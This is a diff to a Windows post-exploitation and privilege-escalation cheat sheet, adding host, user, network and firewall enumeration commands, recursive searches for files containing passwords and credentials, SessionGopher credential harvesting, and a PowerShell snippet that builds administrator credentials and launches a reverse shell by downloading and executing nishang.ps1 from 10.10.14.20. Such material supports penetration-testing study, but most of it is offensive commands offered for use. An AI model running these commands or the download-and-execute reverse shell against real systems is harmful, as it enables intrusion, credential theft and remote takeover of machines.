@@ -1,10 +1,51 @@
 # Windows
 
-## **Enumerating OS Version and Architecture**
+## **OS Version and Architecture**
 
 ```
 systeminfo
 systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
+```
+
+## User Info
+
+```
+whoami
+whoami /priv
+whoami /groups
+whoami /all
+net user
+net user someUser
+net user /domain
+net group /domain
+net localgroup 
+net localgroup someLocalGroup
+```
+
+## Network Information
+
+```
+ipconfig
+ipconfig /all
+arp -a
+route print
+netstat -ano
+```
+
+## Firewall/AV
+
+```
+sc query windefend
+netsh advfirewall show currentprofile
+netsh advfirewall firewall show rule name=all
+netsh advfirewall firewall dump
+netsh firewall show state
+```
+
+## List Drives
+
+```
+wmic logicaldisk get caption,description,providername
 ```
 
 ## Unpatched Software
@@ -636,6 +677,7 @@ Tools to extract passwords from browsers:
 cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
 findstr /si password *.xml *.ini *.txt *.config
 findstr /spin "password" *.*
+dir /s *pass* == *cred* == *vnc* == *.config*
 ```
 
 **Search for a file with a certain filename**
@@ -668,6 +710,21 @@ Import-Module path\to\SessionGopher.ps1;
 Invoke-SessionGopher -Thorough
 Invoke-SessionGopher -AllDomain -o
 Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
+```
+
+### Have a password for potential cred re-use?
+
+Using powershell, the command&#x20;
+
+```
+$passwd = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force
+$creds = New-Object System.Management.Automation.PSCredential('administrator' $passwd)
+```
+
+Will store the credentials in `$creds` for the session. A reverse shell can now be opened with the supplied credentials using the command:
+
+```
+Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.webClient).downloadString('http:///10.10.14.20/nishang.ps1')" -Credential $creds
 ```
 
 ## Powershell History
